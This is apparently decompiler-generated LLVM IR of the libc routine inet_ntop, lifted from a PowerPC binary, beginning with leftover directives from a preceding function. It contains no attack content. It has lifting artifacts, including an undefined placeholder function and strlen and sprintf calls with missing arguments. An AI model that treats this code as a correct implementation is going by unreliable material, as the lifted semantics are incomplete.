  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 100, { 2, 3, 0, 1 }
  uselistorder i32 15, { 0, 2, 3, 4, 1, 11, 8, 6, 7, 10, 5, 9 }
  uselistorder i32 268500992, { 23, 25, 26, 24, 0, 27, 28, 19, 20, 1, 21, 22, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 15, 14, 12, 13, 16, 17, 18 }
  uselistorder label %dec_label_pc_10014634, { 1, 0 }
  uselistorder label %dec_label_pc_100145b8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1001464c = icmp slt i32 %arg1, 2
  %v3_1001464c = icmp eq i32 %arg1, 2
  store i1 %v1_1001464c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001464c, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1001464c, label %dec_label_pc_1001467c, label %dec_label_pc_10014670

dec_label_pc_10014670:                            ; preds = %entry
  %v1_10014670 = icmp slt i32 %arg1, 10
  %v3_10014670 = icmp eq i32 %arg1, 10
  store i1 %v1_10014670, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014670, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014670, label %dec_label_pc_100146b4.lr.ph, label %dec_label_pc_100148c8

dec_label_pc_1001467c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1001468c.506 to i32), i32* @lr, align 4
  %v3_10014688 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_100148c0

dec_label_pc_100146b4.lr.ph:                      ; preds = %dec_label_pc_10014670
  %v2_10014690 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10014690, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100146a4.507 to i32), i32* @lr, align 4
  %v3_100146a0 = call i32 @__GI_memset(i32 %v2_10014690, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_100146d415 = load i32, i32* @r27, align 4
  store i32 %v0_100146d415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100146b4

dec_label_pc_100146b4:                            ; preds = %dec_label_pc_100146b4.lr.ph, %dec_label_pc_100146b4
  %v1_100146c8 = phi i32 [ 0, %dec_label_pc_100146b4.lr.ph ], [ %v1_100146d8, %dec_label_pc_100146b4 ]
  %v0_100146b4 = phi i32 [ %v0_100146d415, %dec_label_pc_100146b4.lr.ph ], [ %v0_100146d4, %dec_label_pc_100146b4 ]
  %v0_100146bc = phi i32 [ %v0_100146d415, %dec_label_pc_100146b4.lr.ph ], [ %v2_100146d4, %dec_label_pc_100146b4 ]
  %v1_100146b4 = phi i32 [ 0, %dec_label_pc_100146b4.lr.ph ], [ %v0_100146cc, %dec_label_pc_100146b4 ]
  %v2_100146b4 = add i32 %v0_100146b4, %v1_100146b4
  %v3_100146b4 = inttoptr i32 %v2_100146b4 to i8*
  %v4_100146b4 = load i8, i8* %v3_100146b4, align 1
  %v5_100146b4 = zext i8 %v4_100146b4 to i32
  %v1_100146b8 = add i32 %v1_100146b4, 2
  store i32 %v1_100146b8, i32* %r11.global-to-local, align 4
  %v1_100146bc = add i32 %v0_100146bc, 1
  %v2_100146bc = inttoptr i32 %v1_100146bc to i8*
  %v3_100146bc = load i8, i8* %v2_100146bc, align 1
  %v4_100146bc = zext i8 %v3_100146bc to i32
  %v1_100146c0 = mul nuw nsw i32 %v5_100146b4, 256
  %v2_100146c4 = or i32 %v4_100146bc, %v1_100146c0
  %v2_100146c8 = load i32, i32* %r29.global-to-local, align 4
  %v3_100146c8 = add i32 %v2_100146c8, %v1_100146c8
  %v4_100146c8 = inttoptr i32 %v3_100146c8 to i32*
  store i32 %v2_100146c4, i32* %v4_100146c8, align 4
  %v0_100146cc = load i32, i32* %r11.global-to-local, align 4
  %v1_100146cc = udiv i32 %v0_100146cc, 2
  %v0_100146d4 = load i32, i32* @r27, align 4
  %v2_100146d4 = add i32 %v0_100146d4, %v0_100146cc
  store i32 %v2_100146d4, i32* %r9.global-to-local, align 4
  %v1_100146d8 = mul i32 %v1_100146cc, 4
  %v0_100146dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100146dc = add i32 %v0_100146dc, -1
  store i32 %v1_100146dc, i32* %ctr.global-to-local, align 4
  %v2_100146dc = icmp eq i32 %v1_100146dc, 0
  br i1 %v2_100146dc, label %dec_label_pc_100146fc.lr.ph, label %dec_label_pc_100146b4

dec_label_pc_100146fc.lr.ph:                      ; preds = %dec_label_pc_100146b4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100146fc

dec_label_pc_100146fc:                            ; preds = %dec_label_pc_100146fc.lr.ph, %dec_label_pc_10014748
  %v0_1001474c = phi i32 [ 8, %dec_label_pc_100146fc.lr.ph ], [ %v1_1001474c, %dec_label_pc_10014748 ]
  %v0_1001473c = phi i32 [ -1, %dec_label_pc_100146fc.lr.ph ], [ %v0_1001473c42, %dec_label_pc_10014748 ]
  %v0_1001472c = phi i32 [ -1, %dec_label_pc_100146fc.lr.ph ], [ %v0_1001472c39, %dec_label_pc_10014748 ]
  %v0_10014700 = phi i32 [ -1, %dec_label_pc_100146fc.lr.ph ], [ %v0_1001470035, %dec_label_pc_10014748 ]
  %v0_10014748 = phi i32 [ 0, %dec_label_pc_100146fc.lr.ph ], [ %v1_10014748, %dec_label_pc_10014748 ]
  %v1_100146fc = mul i32 %v0_10014748, 4
  %v3_10014700 = icmp eq i32 %v0_10014700, -1
  %v2_10014704 = add i32 %v1_100146fc, %v2_10014690
  %v3_10014704 = inttoptr i32 %v2_10014704 to i32*
  %v4_10014704 = load i32, i32* %v3_10014704, align 4
  %v3_10014708 = icmp eq i32 %v4_10014704, 0
  br i1 %v3_10014708, label %dec_label_pc_10014710, label %dec_label_pc_10014728

dec_label_pc_10014710:                            ; preds = %dec_label_pc_100146fc
  br i1 %v3_10014700, label %dec_label_pc_10014714, label %dec_label_pc_10014720

dec_label_pc_10014714:                            ; preds = %dec_label_pc_10014710
  store i32 %v0_10014748, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_10014748

dec_label_pc_10014720:                            ; preds = %dec_label_pc_10014710
  %v0_10014720 = load i32, i32* @r31, align 4
  %v1_10014720 = add i32 %v0_10014720, 1
  store i32 %v1_10014720, i32* @r31, align 4
  br label %dec_label_pc_10014748

dec_label_pc_10014728:                            ; preds = %dec_label_pc_100146fc
  br i1 %v3_10014700, label %dec_label_pc_10014748, label %dec_label_pc_1001472c

dec_label_pc_1001472c:                            ; preds = %dec_label_pc_10014728
  %v3_1001472c = icmp eq i32 %v0_1001472c, -1
  %v0_10014740.pre = load i32, i32* @r31, align 4
  %v1_10014734 = load i32, i32* @r30, align 4
  %v3_10014734 = icmp sgt i32 %v0_10014740.pre, %v1_10014734
  %or.cond = or i1 %v3_1001472c, %v3_10014734
  br i1 %or.cond, label %dec_label_pc_1001473c, label %dec_label_pc_10014744

dec_label_pc_1001473c:                            ; preds = %dec_label_pc_1001472c
  store i32 %v0_1001473c, i32* @r28, align 4
  store i32 %v0_10014740.pre, i32* @r30, align 4
  br label %dec_label_pc_10014744

dec_label_pc_10014744:                            ; preds = %dec_label_pc_1001472c, %dec_label_pc_1001473c
  %v0_1001472c40 = phi i32 [ %v0_1001473c, %dec_label_pc_1001473c ], [ %v0_1001472c, %dec_label_pc_1001472c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014748

dec_label_pc_10014748:                            ; preds = %dec_label_pc_10014728, %dec_label_pc_10014720, %dec_label_pc_10014714, %dec_label_pc_10014744
  %v0_1001473c42 = phi i32 [ %v0_1001473c, %dec_label_pc_10014728 ], [ %v0_1001473c, %dec_label_pc_10014720 ], [ %v0_10014748, %dec_label_pc_10014714 ], [ -1, %dec_label_pc_10014744 ]
  %v0_1001470035 = phi i32 [ -1, %dec_label_pc_10014728 ], [ %v0_10014700, %dec_label_pc_10014720 ], [ %v0_10014748, %dec_label_pc_10014714 ], [ -1, %dec_label_pc_10014744 ]
  %v0_1001472c39 = phi i32 [ %v0_1001472c, %dec_label_pc_10014728 ], [ %v0_1001472c, %dec_label_pc_10014720 ], [ %v0_1001472c, %dec_label_pc_10014714 ], [ %v0_1001472c40, %dec_label_pc_10014744 ]
  %v1_10014748 = add nuw nsw i32 %v0_10014748, 1
  store i32 %v1_10014748, i32* %r11.global-to-local, align 4
  %v1_1001474c = add nsw i32 %v0_1001474c, -1
  store i32 %v1_1001474c, i32* %ctr.global-to-local, align 4
  %v2_1001474c = icmp eq i32 %v1_1001474c, 0
  br i1 %v2_1001474c, label %dec_label_pc_10014750, label %dec_label_pc_100146fc

dec_label_pc_10014750:                            ; preds = %dec_label_pc_10014748
  %v3_10014750 = icmp eq i32 %v0_1001473c42, -1
  %v1_10014770 = icmp slt i32 %v0_1001472c39, -1
  %v3_10014770 = icmp eq i32 %v0_1001472c39, -1
  store i1 %v1_10014770, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014770, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014750, label %dec_label_pc_10014770, label %dec_label_pc_10014758

dec_label_pc_10014758:                            ; preds = %dec_label_pc_10014750
  %v0_10014768.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014770, label %dec_label_pc_10014768, label %dec_label_pc_10014760

dec_label_pc_10014760:                            ; preds = %dec_label_pc_10014758
  %v1_10014760 = load i32, i32* @r30, align 4
  %v2_10014760 = icmp slt i32 %v0_10014768.pre, %v1_10014760
  %v3_10014760 = icmp sgt i32 %v0_10014768.pre, %v1_10014760
  %v4_10014760 = icmp eq i32 %v0_10014768.pre, %v1_10014760
  store i1 %v2_10014760, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014760, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014760, label %dec_label_pc_10014768, label %dec_label_pc_10014770.thread

dec_label_pc_10014768:                            ; preds = %dec_label_pc_10014758, %dec_label_pc_10014760
  store i32 %v0_10014768.pre, i32* @r30, align 4
  store i32 %v0_1001473c42, i32* @r28, align 4
  br label %dec_label_pc_10014770.thread

dec_label_pc_10014770.thread:                     ; preds = %dec_label_pc_10014768, %dec_label_pc_10014760
  %v0_1001477876 = phi i32 [ %v1_10014760, %dec_label_pc_10014760 ], [ %v0_10014768.pre, %dec_label_pc_10014768 ]
  %v0_10014770.ph = phi i32 [ %v0_1001472c39, %dec_label_pc_10014760 ], [ %v0_1001473c42, %dec_label_pc_10014768 ]
  %v1_1001477059 = icmp slt i32 %v0_10014770.ph, -1
  %v3_1001477061 = icmp eq i32 %v0_10014770.ph, -1
  store i1 %v1_1001477059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001477061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014778

dec_label_pc_10014770:                            ; preds = %dec_label_pc_10014750
  br i1 %v3_10014770, label %dec_label_pc_10014784, label %dec_label_pc_10014770.dec_label_pc_10014778_crit_edge

dec_label_pc_10014770.dec_label_pc_10014778_crit_edge: ; preds = %dec_label_pc_10014770
  %v0_10014778.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014778

dec_label_pc_10014778:                            ; preds = %dec_label_pc_10014770.dec_label_pc_10014778_crit_edge, %dec_label_pc_10014770.thread
  %v0_10014778 = phi i32 [ %v0_1001477876, %dec_label_pc_10014770.thread ], [ %v0_10014778.pre, %dec_label_pc_10014770.dec_label_pc_10014778_crit_edge ]
  %v0_1001477062 = phi i32 [ %v0_10014770.ph, %dec_label_pc_10014770.thread ], [ %v0_1001472c39, %dec_label_pc_10014770.dec_label_pc_10014778_crit_edge ]
  %v1_10014778 = icmp slt i32 %v0_10014778, 1
  %v2_10014778 = icmp sgt i32 %v0_10014778, 1
  %v3_10014778 = icmp eq i32 %v0_10014778, 1
  store i1 %v1_10014778, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014778, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014778, label %dec_label_pc_10014784, label %dec_label_pc_10014780

dec_label_pc_10014780:                            ; preds = %dec_label_pc_10014778
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10014784

dec_label_pc_10014784:                            ; preds = %dec_label_pc_10014778, %dec_label_pc_10014770, %dec_label_pc_10014780
  %v0_100147903 = phi i32 [ %v0_1001477062, %dec_label_pc_10014778 ], [ -1, %dec_label_pc_10014770 ], [ -1, %dec_label_pc_10014780 ]
  %v2_10014784 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10014784, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_100147904 = icmp slt i32 %v0_100147903, -1
  %v3_100147906 = icmp eq i32 %v0_100147903, -1
  store i1 %v1_100147904, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100147906, i1* %cr7_eq.global-to-local, align 1
  %v2_10014800 = icmp slt i32 %tmp, 65535
  %v4_10014800 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10014790

dec_label_pc_10014790:                            ; preds = %dec_label_pc_10014784, %dec_label_pc_1001485c
  %v2_100147cc = phi i32 [ %v2_10014784, %dec_label_pc_10014784 ], [ %v2_100147b451, %dec_label_pc_1001485c ]
  %v0_100147a0 = phi i32 [ %v0_100147903, %dec_label_pc_10014784 ], [ %v0_10014790, %dec_label_pc_1001485c ]
  %v0_100147c0 = phi i32 [ 0, %dec_label_pc_10014784 ], [ %v1_1001485c, %dec_label_pc_1001485c ]
  %v3_100147907 = phi i1 [ %v3_100147906, %dec_label_pc_10014784 ], [ %v3_10014790, %dec_label_pc_1001485c ]
  br i1 %v3_100147907, label %dec_label_pc_100147c0, label %dec_label_pc_10014798

dec_label_pc_10014798:                            ; preds = %dec_label_pc_10014790
  %v2_10014798 = icmp slt i32 %v0_100147c0, %v0_100147a0
  %v4_10014798 = icmp eq i32 %v0_100147c0, %v0_100147a0
  br i1 %v2_10014798, label %dec_label_pc_100147c0, label %dec_label_pc_100147a0

dec_label_pc_100147a0:                            ; preds = %dec_label_pc_10014798
  %v1_100147a0 = load i32, i32* @r30, align 4
  %v2_100147a0 = add i32 %v1_100147a0, %v0_100147a0
  %v2_100147a4 = icmp slt i32 %v0_100147c0, %v2_100147a0
  %v4_100147a4 = icmp eq i32 %v0_100147c0, %v2_100147a0
  store i1 %v2_100147a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100147a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100147a4, label %dec_label_pc_100147ac, label %dec_label_pc_100147c0

dec_label_pc_100147ac:                            ; preds = %dec_label_pc_100147a0
  br i1 %v4_10014798, label %dec_label_pc_100147b0, label %dec_label_pc_1001485c

dec_label_pc_100147b0:                            ; preds = %dec_label_pc_100147ac
  %v3_100147b4 = inttoptr i32 %v2_100147cc to i8*
  store i8 58, i8* %v3_100147b4, align 1
  %v0_100147b8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100147b8 = add i32 %v0_100147b8, 1
  store i32 %v1_100147b8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001485c

dec_label_pc_100147c0:                            ; preds = %dec_label_pc_100147a0, %dec_label_pc_10014798, %dec_label_pc_10014790
  %v1_100147c0 = icmp slt i32 %v0_100147c0, 0
  %v3_100147c0 = icmp eq i32 %v0_100147c0, 0
  store i1 %v1_100147c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100147c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100147c0, label %dec_label_pc_100147d4.thread, label %dec_label_pc_100147d4

dec_label_pc_100147d4.thread:                     ; preds = %dec_label_pc_100147c0
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014838

dec_label_pc_100147d4:                            ; preds = %dec_label_pc_100147c0
  %v3_100147cc = inttoptr i32 %v2_100147cc to i8*
  store i8 58, i8* %v3_100147cc, align 1
  %v0_100147d0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100147d0 = add i32 %v0_100147d0, 1
  store i32 %v1_100147d0, i32* %r29.global-to-local, align 4
  %v0_100147d4.pre = load i32, i32* @r31, align 4
  %v1_100147d4 = icmp slt i32 %v0_100147d4.pre, 6
  %v3_100147d4 = icmp eq i32 %v0_100147d4.pre, 6
  store i1 %v1_100147d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100147d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100147d4, label %dec_label_pc_100147dc, label %dec_label_pc_10014838

dec_label_pc_100147dc:                            ; preds = %dec_label_pc_100147d4
  %v0_100147dc = load i32, i32* @r28, align 4
  %v1_100147dc = icmp slt i32 %v0_100147dc, 0
  %v3_100147dc = icmp eq i32 %v0_100147dc, 0
  store i1 %v1_100147dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100147dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100147dc, label %dec_label_pc_100147e4, label %dec_label_pc_10014838

dec_label_pc_100147e4:                            ; preds = %dec_label_pc_100147dc
  %v0_100147e4 = load i32, i32* @r30, align 4
  %v1_100147e4 = icmp slt i32 %v0_100147e4, 6
  %v3_100147e4 = icmp eq i32 %v0_100147e4, 6
  store i1 %v1_100147e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100147e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100147e4, label %dec_label_pc_10014808, label %dec_label_pc_100147ec

dec_label_pc_100147ec:                            ; preds = %dec_label_pc_100147e4
  %v1_100147ec = icmp slt i32 %v0_100147e4, 5
  %v3_100147ec = icmp eq i32 %v0_100147e4, 5
  store i1 %v1_100147ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100147ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100147ec, label %dec_label_pc_100147f4, label %dec_label_pc_10014838

dec_label_pc_100147f4:                            ; preds = %dec_label_pc_100147ec
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10014800, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014800, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014800, label %dec_label_pc_10014808, label %dec_label_pc_10014838

dec_label_pc_10014808:                            ; preds = %dec_label_pc_100147f4, %dec_label_pc_100147e4
  %v1_10014808 = load i32, i32* @r1, align 4
  %v2_10014808 = sub i32 %v1_10014808, %v1_100147d0
  %v0_1001480c = load i32, i32* @r27, align 4
  %v1_1001480c = add i32 %v0_1001480c, 12
  %v1_10014810 = add i32 %v2_10014808, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1001481c.508 to i32), i32* @lr, align 4
  %v3_10014818 = call i32 @inet_ntop4(i32 %v1_1001480c, i32 %v1_100147d0, i32 %v1_10014810)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10014820 = icmp slt i32 %v3_10014818, 0
  %v3_10014820 = icmp eq i32 %v3_10014818, 0
  store i1 %v1_10014820, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014820, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014820, label %dec_label_pc_100148d8, label %dec_label_pc_10014828

dec_label_pc_10014828:                            ; preds = %dec_label_pc_10014808
  %v0_10014828 = load i32, i32* @r29, align 4
  store i32 %v0_10014828, i32* @r3, align 4
  %v0_1001482c = call i32 @__GI_strlen()
  %v0_10014830 = load i32, i32* @r29, align 4
  %v2_10014830 = add i32 %v0_10014830, %v0_1001482c
  store i32 %v2_10014830, i32* %r29.global-to-local, align 4
  %v0_10014870.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10014870

dec_label_pc_10014838:                            ; preds = %dec_label_pc_100147d4.thread, %dec_label_pc_100147f4, %dec_label_pc_100147ec, %dec_label_pc_100147dc, %dec_label_pc_100147d4
  %v0_1001481466 = phi i32 [ %v2_100147cc, %dec_label_pc_100147d4.thread ], [ %v1_100147d0, %dec_label_pc_100147f4 ], [ %v1_100147d0, %dec_label_pc_100147ec ], [ %v1_100147d0, %dec_label_pc_100147dc ], [ %v1_100147d0, %dec_label_pc_100147d4 ]
  store i32 %v2_10014690, i32* %r9.global-to-local, align 4
  store i32 %v0_1001481466, i32* @r3, align 4
  store i32 268519512, i32* @lr, align 4
  %v1_10014854 = call i32 @sprintf(i32 %v0_1001481466)
  %v0_10014858 = load i32, i32* @r29, align 4
  %v2_10014858 = add i32 %v0_10014858, %v1_10014854
  store i32 %v2_10014858, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001485c

dec_label_pc_1001485c:                            ; preds = %dec_label_pc_100147ac, %dec_label_pc_100147b0, %dec_label_pc_10014838
  %v2_100147b451 = phi i32 [ %v2_100147cc, %dec_label_pc_100147ac ], [ %v1_100147b8, %dec_label_pc_100147b0 ], [ %v2_10014858, %dec_label_pc_10014838 ]
  %v0_1001485c = load i32, i32* @r31, align 4
  %v1_1001485c = add i32 %v0_1001485c, 1
  store i32 %v1_1001485c, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1001485c, 8
  %v0_10014790 = load i32, i32* @r28, align 4
  %v1_10014790 = icmp slt i32 %v0_10014790, -1
  %v3_10014790 = icmp eq i32 %v0_10014790, -1
  store i1 %v1_10014790, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014790, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10014790, label %dec_label_pc_10014868

dec_label_pc_10014868:                            ; preds = %dec_label_pc_1001485c
  br i1 %v3_10014790, label %dec_label_pc_10014888, label %dec_label_pc_10014870

dec_label_pc_10014870:                            ; preds = %dec_label_pc_10014868, %dec_label_pc_10014828
  %v2_10014880 = phi i32 [ %v2_100147b451, %dec_label_pc_10014868 ], [ %v2_10014830, %dec_label_pc_10014828 ]
  %v0_10014870 = phi i32 [ %v0_10014790, %dec_label_pc_10014868 ], [ %v0_10014870.pre, %dec_label_pc_10014828 ]
  %v1_10014870 = load i32, i32* @r30, align 4
  %v2_10014870 = add i32 %v1_10014870, %v0_10014870
  %v1_10014874 = icmp slt i32 %v2_10014870, 8
  %v3_10014874 = icmp eq i32 %v2_10014870, 8
  store i1 %v1_10014874, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014874, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014874, label %dec_label_pc_1001487c, label %dec_label_pc_10014888

dec_label_pc_1001487c:                            ; preds = %dec_label_pc_10014870
  %v3_10014880 = inttoptr i32 %v2_10014880 to i8*
  store i8 58, i8* %v3_10014880, align 1
  %v0_10014884 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014884 = add i32 %v0_10014884, 1
  store i32 %v1_10014884, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014888

dec_label_pc_10014888:                            ; preds = %dec_label_pc_10014870, %dec_label_pc_10014868, %dec_label_pc_1001487c
  %v2_1001489c = phi i32 [ %v2_10014880, %dec_label_pc_10014870 ], [ %v2_100147b451, %dec_label_pc_10014868 ], [ %v1_10014884, %dec_label_pc_1001487c ]
  %v1_10014888 = sub i32 1, %v2_10014784
  %v2_10014890 = add i32 %v1_10014888, %v2_1001489c
  %v1_10014894 = load i32, i32* @r26, align 4
  %v2_10014894 = icmp ult i32 %v2_10014890, %v1_10014894
  %v4_10014894 = icmp eq i32 %v2_10014890, %v1_10014894
  store i1 %v2_10014894, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014894, i1* %cr7_eq.global-to-local, align 1
  %v3_1001489c = inttoptr i32 %v2_1001489c to i8*
  store i8 0, i8* %v3_1001489c, align 1
  %v0_100148a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100148a0 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100148a0 = or i1 %v0_100148a0, %v1_100148a0
  br i1 %v2_100148a0, label %dec_label_pc_100148b8, label %dec_label_pc_100148a4

dec_label_pc_100148a4:                            ; preds = %dec_label_pc_10014888
  %v0_100148a4 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100148b0 = inttoptr i32 %v0_100148a4 to i32*
  store i32 28, i32* %v2_100148b0, align 4
  %v0_100148dc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100148d8

dec_label_pc_100148b8:                            ; preds = %dec_label_pc_10014888
  %v0_100148b8 = load i32, i32* @r25, align 4
  %v2_100148bc = bitcast i32* %stack_var_-88 to i8*
  %v3_100148bc = call i32 @strcpy(i32 %v0_100148b8, i8* %v2_100148bc)
  br label %dec_label_pc_100148c0

dec_label_pc_100148c0:                            ; preds = %dec_label_pc_1001467c, %dec_label_pc_100148b8
  %storemerge1 = phi i32 [ %v3_10014688, %dec_label_pc_1001467c ], [ %v3_100148bc, %dec_label_pc_100148b8 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100148d8

dec_label_pc_100148c8:                            ; preds = %dec_label_pc_10014670
  %v0_100148c8 = call i32 @__errno_location()
  %v2_100148d0 = inttoptr i32 %v0_100148c8 to i32*
  store i32 97, i32* %v2_100148d0, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100148d8

dec_label_pc_100148d8:                            ; preds = %dec_label_pc_10014808, %dec_label_pc_100148c0, %dec_label_pc_100148a4, %dec_label_pc_100148c8
  %v0_100148dc = phi i32 [ 0, %dec_label_pc_10014808 ], [ %storemerge1, %dec_label_pc_100148c0 ], [ %v0_100148dc.pre, %dec_label_pc_100148a4 ], [ 0, %dec_label_pc_100148c8 ]
  ret i32 %v0_100148dc

; uselistorder directives
  uselistorder i32 %v2_1001489c, { 1, 0 }
  uselistorder i32 %v2_10014870, { 1, 0 }
  uselistorder i1 %v3_10014790, { 0, 2, 1 }
  uselistorder i32 %v0_10014790, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1001485c, { 2, 1, 0 }
  uselistorder i32 %v0_1001481466, { 1, 0 }
  uselistorder i32 %v3_10014818, { 1, 0 }
  uselistorder i32 %v0_100147e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100147d0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_100147a0, { 1, 0 }
  uselistorder i32 %v0_100147c0, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_100147a0, { 0, 2, 1 }
  uselistorder i32 %v2_100147cc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100147903, { 0, 2, 1 }
  uselistorder i32 %v0_10014778, { 2, 1, 0 }
  uselistorder i32 %v0_10014768.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_10014770, { 1, 0, 2 }
  uselistorder i32 %v1_1001474c, { 2, 1, 0 }
  uselistorder i32 %v1_10014748, { 1, 0 }
  uselistorder i32 %v0_1001472c39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1001473c42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10014700, { 1, 0 }
  uselistorder i32 %v0_10014748, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10014700, { 1, 0 }
  uselistorder i32 %v0_1001472c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1001473c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_100146dc, { 1, 0 }
  uselistorder i32 %v2_100146d4, { 1, 0 }
  uselistorder i32 %v0_100146cc, { 1, 0, 2 }
  uselistorder i32 %v1_100146b4, { 1, 0 }
  uselistorder i32 %v2_10014690, { 1, 0, 2, 3 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 19, 12, 17, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 19, 12, 17, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* @r1, { 3, 5, 4, 1, 9, 0, 10, 2, 6, 7, 8, 11, 12, 13, 14 }
  uselistorder i1 true, { 6, 2, 8, 9, 3, 4, 5, 0, 7, 10, 1 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 65535, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 18, 17, 9, 16, 4, 2, 8, 7, 6, 0, 3, 15, 14, 1, 5, 19, 13, 12, 11, 10 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
